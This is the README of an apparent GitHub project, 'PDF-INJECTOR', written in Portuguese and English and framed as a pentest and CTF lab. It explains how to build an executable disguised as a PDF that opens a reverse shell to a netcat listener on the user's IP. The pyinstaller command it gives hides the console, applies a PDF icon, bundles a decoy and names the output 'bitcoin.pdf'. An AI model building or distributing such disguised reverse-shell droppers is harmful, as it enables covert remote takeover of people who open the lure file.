# PDF-INJECTOR
Este projeto é um ambiente de laboratório para estudos sobre persistência e execução de código em documentos PDF. O objetivo é demonstrar como objetos maliciosos podem ser injetados em arquivos PDF para executar comandos remotos, visando a análise de vetores de ataque em cenários de pentest e competições de CTF.

as seguintes bibliotecas devem estar instaladas socket,subprocess,os,sys,webbrowser,threading,time, antes de usar devera ter seu pdf e arquivo ico de pdf na pasta, arquivos de exemplo ja estarão no reporsitorio, vale ressaltar que o pyinstaller tambem devera estar instalado, o ip devera ser mudado no codigo pdf-injector.py de acordo com seu ip, após isso sera nescessario usar o netcat para receber a conexão.


This project is a laboratory environment for studying code persistence and execution in PDF documents. The goal is to demonstrate how malicious objects can be injected into PDF files to execute remote commands, aiming at the analysis of attack vectors in pentest scenarios and CTF competitions.

The following libraries must be installed: socket, subprocess, os, sys, webbrowser, threading, time. Before using, you must have your PDF and PDF ICO files in the folder. Example files will already be in the repository. It is worth noting that pyinstaller must also be installed. The IP address must be changed in the pdf-injector.py code according to your IP address. After that, it will be necessary to use netcat to receive the connection.

Command to create the infected pdf

 pyinstaller --onefile --noconsole --icon=pdf.ico --add-data "bitcoin.pdf;." --name bitcoin.pdf pdf-injector.py

### Demonstração do Payload
![Conexão da Reverse Shell](https://github.com/ronallldd/PDF-INJECTOR/raw/main/05.03.2026_21.00.22_REC.gif)

